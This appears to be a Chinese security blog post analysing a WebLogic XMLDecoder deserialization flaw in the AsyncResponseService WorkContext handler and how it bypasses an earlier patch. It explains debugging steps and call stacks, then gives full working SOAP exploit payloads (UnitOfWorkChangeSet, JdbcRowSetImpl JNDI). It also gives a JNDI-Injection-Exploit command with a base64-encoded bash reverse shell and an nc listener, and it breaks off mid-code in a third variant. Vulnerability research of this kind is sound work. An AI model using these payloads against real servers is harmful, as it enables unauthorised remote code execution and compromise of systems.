&lt;p>在weblogic.wsee.async.AsyncResponseHandler#handleRequest处下断点，随便构造一个soap post消息即可触发断点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soap:Envelope&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xmlns:soap=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">soap:encodingStyle=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soap:Body&lt;/span> &lt;span style="color:#75af00">xmlns:m=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.org/stock&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;m:GetStockPrice&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;m:StockName&amp;gt;&lt;/span>IBM&lt;span style="color:#f92672">&amp;lt;/m:StockName&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/m:GetStockPrice&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soap:Body&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soap:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对message进行一些判断之后要取出weblogic.wsee.addressing.RelatesTo这个属性，但是我们构造的soap不满足条件，先gg&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012133724062.png" alt="image-20221012133724062">&lt;/p>
&lt;p>解决办法是添加一对&lt;code>&amp;lt;ads:RelatesTo&amp;gt;test&amp;lt;/ads:RelatesTo&amp;gt;&lt;/code>标签&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soap:Envelope&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xmlns:soap=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">soap:encodingStyle=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xmlns:ads=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2005/08/addressing&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soap:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ads:Action&amp;gt;&lt;/span>demo&lt;span style="color:#f92672">&amp;lt;/ads:Action&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ads:RelatesTo&amp;gt;&lt;/span>test&lt;span style="color:#f92672">&amp;lt;/ads:RelatesTo&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soap:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soap:Body&lt;/span> &lt;span style="color:#75af00">xmlns:m=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.org/stock&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;m:GetStockPrice&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;m:StockName&amp;gt;&lt;/span>IBM&lt;span style="color:#f92672">&amp;lt;/m:StockName&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/m:GetStockPrice&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soap:Body&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/soap:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是继续跟进到handleRequestInternal的时候会报错Cannot retrieve request information for message test，再往前寻找调用过程中，也好像没啥可以利用的点，遂放弃&lt;/p>
&lt;p>不过在中间过断点的过程中还是能知道大致的处理流程的，有多个handler集成在HandlerIterator中，里面的handler都叫handleRequest，我们之前关注的只是AsyncResponseHandler，后面还有WorkAreaServerHandler处理xml中的部分内容&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013101652555.png" alt="image-20221013101652555">&lt;/p>
&lt;h4 id="poc1---unitofworkchangeset">poc1 - UnitOfWorkChangeSet&lt;/h4>
&lt;p>*还是不得不感叹一句假poc的猖獗，甚至一些看着很“精美”的复现文章里也是如此。&lt;/p>
&lt;p>先看一下最终poc长啥样&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012172607979.png" alt="image-20221012172607979">&lt;/p>
&lt;p>我们先构造个简易的poc发个包看看&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soapenv:Envelope&lt;/span> &lt;span style="color:#75af00">xmlns:soapenv=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:wsa=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2005/08/addressing&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:asy=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.bea.com/async/AsyncResponseService&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;soapenv:Header&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;wsa:Action&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:Action&amp;gt;&amp;lt;wsa:RelatesTo&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:RelatesTo&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;work:WorkContext&lt;/span> &lt;span style="color:#75af00">xmlns:work=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;&amp;lt;string&amp;gt;&lt;/span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;void&amp;gt;&amp;lt;array&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;byte&amp;#34;&lt;/span> &lt;span style="color:#75af00">length=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;void&lt;/span> &lt;span style="color:#75af00">index=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;byte&amp;gt;&lt;/span>120&lt;span style="color:#f92672">&amp;lt;/byte&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/array&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/class&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/work:WorkContext&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soapenv:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soapenv:Body&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们的payload内容在WorkContext中，针对这部分xml有单独的WorkAreaServerHandler，直接在WorkAreaServerHandler中打断点根本断不下来（也可能是我脸黑），我们选择在HandlerIterator#handleRequest中截胡&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013103128677.png" alt="image-20221013103128677">&lt;/p>
&lt;p>断在这个var5的地方，当this.index为16的时候就会进入WorkAreaServerHandler中&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013134849064.png" alt="image-20221013134849064">&lt;/p>
&lt;p>这里的WorkContextXmlInputAdapter会继续调用WorkContextXmlInputAdapter#readUTF&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013135234883.png" alt="image-20221013135234883">&lt;/p>
&lt;p>我们熟悉的xmlDecoder.readObject出现了（注1）；继续看调用栈，之后对xml的处理过程中会进入UnitOfWorkChangeSet&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;init&amp;gt;:59, UnitOfWorkChangeSet (oracle.toplink.internal.sessions)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:57, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:525, Constructor (java.lang.reflect)
invokeInternal:295, Statement (java.beans)
access$000:58, Statement (java.beans)
run:185, Statement$2 (java.beans)
doPrivileged:-1, AccessController (java.security)
invoke:182, Statement (java.beans)
getValue:153, Expression (java.beans)
getValueObject:166, ObjectElementHandler (com.sun.beans.decoder)
// omit
readObject:250, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
handleRequest:27, WorkAreaServerHandler (weblogic.wsee.workarea)
handleRequest:141, HandlerIterator (weblogic.wsee.handler)
dispatch:114, ServerDispatcher (weblogic.wsee.ws.dispatch.server)
// omit
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013104107459.png" alt="image-20221013104107459">&lt;/p>
&lt;p>见到了我们日思夜想的readObject（正好位于构造方法中，可以绕过之前fix不能调用方法的限制），把array中嵌套的byte标签中的内容进行readObject处理，后面的内容我们可以衔接7u21的原生链，将payload转换为byte发送&lt;/p>
&lt;p>注1：这也就是为什么假poc泛滥猖獗的原因，因为这个WorkContextImlInputAdapter在cve-2017-10271中也可以触发，后面跟着XMLDecoder，也可以粗暴的理解：WorkContextImlInputAdapter是cve-2017-10271的一个触发点，而我们这里的WorkAreaServerHandler就调用了WorkContextImplInputAdapter，所以假poc只不过是找到了cve-2017-10271的又一个新的触发点，而没有真正绕过validate的黑名单&lt;/p>
&lt;p>payload被传入后执行的流程大致是这样的：&lt;/p>
&lt;pre tabindex="0">&lt;code>AsyncResponseService-&amp;gt; HandlerIterator-&amp;gt; WorkAreaServerHandler-&amp;gt; WorkContextXmlInputAdapter-&amp;gt; validate-&amp;gt; XMLDecoder-&amp;gt; readObject
&lt;/code>&lt;/pre>&lt;p>所以正经poc是怎么绕过的呢？在补丁中忽略了&lt;code>&amp;lt;class&amp;gt;&lt;/code>标签，它可以代表一个类的实例，我们可以用它创建任意类的实例，也就是正经poc中的&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;......&amp;lt;/class&amp;gt;&amp;lt;/java&amp;gt;
&lt;/code>&lt;/pre>&lt;p>一个测试poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soapenv:Envelope&lt;/span> &lt;span style="color:#75af00">xmlns:soapenv=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:wsa=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2005/08/addressing&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:asy=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.bea.com/async/AsyncResponseService&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;soapenv:Header&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;wsa:Action&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:Action&amp;gt;&amp;lt;wsa:RelatesTo&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:RelatesTo&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;work:WorkContext&lt;/span> &lt;span style="color:#75af00">xmlns:work=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;&amp;lt;string&amp;gt;&lt;/span>java.net.Socket&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;void&amp;gt;&amp;lt;string&amp;gt;&lt;/span>weblogic.30nux0.ceye.io&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;int&amp;gt;&lt;/span>80&lt;span style="color:#f92672">&amp;lt;/int&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/class&amp;gt;&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/work:WorkContext&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soapenv:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soapenv:Body&amp;gt;&amp;lt;asy:onAsyncDelivery/&amp;gt;&amp;lt;/soapenv:Body&amp;gt;&amp;lt;/soapenv:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果加换行符会在jdk7上失败，不加换行符在6和7上都可以&lt;/p>
&lt;h4 id="poc2---jdbcrowsetimpljdk7">poc2 - JdbcRowSetImpl(jdk7)&lt;/h4>
&lt;p>在12c中没有oracle.toplink.internal.sessions.UnitOfWorkChangeSet，自然也用不了上面的poc，但是class标签还是有的，可以创建类的实例但调用不了方法（我们只能找对应类的构造方法），同时12.1.3的最低支持版本为1.7，12.2.1及以上最低版本为1.8，11g的最低版本为1.6&lt;/p>
&lt;p>jdk6和jdk7处理标签的方式不同，jdk6使用的是com.sun.beans.ObjectHandler，jdk7使用的是com.sun.beans.decoder.DocumentHandler，比jdk6新增了new, property等标签的支持，再配合com.sun.rowset.JdbcRowSetImpl来执行命令&lt;/p>
&lt;p>JdbcRowSetImpl也是2017-10271的一个绕过方式，poc长这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&lt;/span> &lt;span style="color:#75af00">version=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1.8.0_131&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.beans.XMLDecoder&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataSourceName&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;string&amp;gt;&lt;/span>rmi://localhost:1099/Exploit&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;void&lt;/span> &lt;span style="color:#75af00">property=&lt;/span>&lt;span style="color:#d88200">&amp;#34;autoCommit&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;boolean&amp;gt;&lt;/span>true&lt;span style="color:#f92672">&amp;lt;/boolean&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们把void class换成class，把void property换成property，换掉后的标签就避开了void标签只能跟index的validate补丁，同时也是适配jdk7的解析标签的方式&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;&amp;lt;string&amp;gt;&lt;/span>com.sun.rowset.JdbcRowSetImpl&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;void&amp;gt;&amp;lt;property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataSourceName&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;string&amp;gt;&lt;/span>rmi://192.168.1.11:1099/bpjuf6&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;/property&amp;gt;&amp;lt;property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;autoCommit&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;boolean&amp;gt;&lt;/span>true&lt;span style="color:#f92672">&amp;lt;/boolean&amp;gt;&amp;lt;/property&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/class&amp;gt;&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soapenv:Envelope&lt;/span> &lt;span style="color:#75af00">xmlns:soapenv=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:wsa=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2005/08/addressing&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:asy=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.bea.com/async/AsyncResponseService&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;soapenv:Header&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;wsa:Action&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:Action&amp;gt;&amp;lt;wsa:RelatesTo&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:RelatesTo&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;work:WorkContext&lt;/span> &lt;span style="color:#75af00">xmlns:work=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;&amp;lt;string&amp;gt;&lt;/span>com.sun.rowset.JdbcRowSetImpl&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;void&amp;gt;&amp;lt;property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataSourceName&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;string&amp;gt;&lt;/span>rmi://192.168.1.11:1099/bpjuf6&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;/property&amp;gt;&amp;lt;property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;autoCommit&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;lt;boolean&amp;gt;&lt;/span>true&lt;span style="color:#f92672">&amp;lt;/boolean&amp;gt;&amp;lt;/property&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/class&amp;gt;&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/work:WorkContext&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soapenv:Header&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;soapenv:Body&amp;gt;&amp;lt;asy:onAsyncDelivery/&amp;gt;&amp;lt;/soapenv:Body&amp;gt;&amp;lt;/soapenv:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再请出我们的jndi一把嗦的工具&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &lt;span style="color:#d88200">&amp;#34;bash -c {echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguMS4xMS84NDI2IDA+JjE=}|{base64,-d}|{bash,-i}&amp;#34;&lt;/span> -A &lt;span style="color:#d88200">&amp;#34;192.168.1.11&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># rmi://192.168.1.11:1099/bpjuf6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc -lvvp &lt;span style="color:#ae81ff">8426&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013164347724.png" alt="image-20221013164347724">&lt;/p>
&lt;p>rce到手&lt;/p>
&lt;h4 id="poc3---eventdataweblogic-1213">poc3 - EventData(weblogic 12.1.3)&lt;/h4>
&lt;p>继续换了一个类来利用，不过这个更弔&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">EventData&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">xml&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span> &lt;span style="color:#111">bais&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">xml&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">XMLDecoder&lt;/span> &lt;span style="color:#111">decoder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">XMLDecoder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bais&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">eventData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">decoder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
